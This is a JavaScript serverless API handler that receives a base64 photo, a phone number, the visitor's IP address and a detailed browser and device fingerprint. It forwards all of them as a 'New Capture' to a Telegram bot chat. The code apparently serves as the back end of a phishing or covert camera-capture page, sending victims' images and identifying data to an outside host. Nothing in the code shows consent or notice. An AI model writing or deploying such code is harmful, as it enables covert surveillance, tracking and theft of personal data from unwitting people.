export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();

    const { image, phone, userAgent, platform, language, languages, screen, screenAvail, timezone, offset, cores, memory, connection, webgl, doNotTrack, referrer, viewport } = req.body;
    if (!image) return res.status(400).json({ error: 'No image' });

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Missing env vars' });

    // Get IP from headers (Vercel proxy)
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';

    // Build caption with all info
    const caption = `📱 **New Capture**\n` +
                    `📞 Phone: ${phone || 'N/A'}\n` +
                    `🌐 IP: ${ip}\n` +
                    `💻 UA: ${userAgent || 'N/A'}\n` +
                    `🖥️ Platform: ${platform || 'N/A'}\n` +
                    `🗣️ Language: ${language || 'N/A'} (${languages ? languages.join(', ') : 'N/A'})\n` +
                    `📺 Screen: ${screen || 'N/A'} (avail: ${screenAvail || 'N/A'})\n` +
                    `🕐 Timezone: ${timezone || 'N/A'} (offset: ${offset || 'N/A'})\n` +
                    `⚙️ Cores: ${cores || 'N/A'} / Memory: ${memory ? memory + ' GB' : 'N/A'}\n` +
                    `📶 Connection: ${connection ? `type=${connection.type}, dl=${connection.downlink}, eff=${connection.effectiveType}` : 'N/A'}\n` +
                    `🎮 WebGL: ${webgl || 'N/A'}\n` +
                    `🚫 DNT: ${doNotTrack || 'N/A'}\n` +
                    `🔗 Referrer: ${referrer || 'N/A'}\n` +
                    `👁️ Viewport: ${viewport || 'N/A'}`;

    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
        form.append('caption', caption);
        form.append('parse_mode', 'Markdown');

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
        });

        if (!response.ok) throw new Error(`Telegram error: ${response.statusText}`);
        res.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: error.message });
    }
}
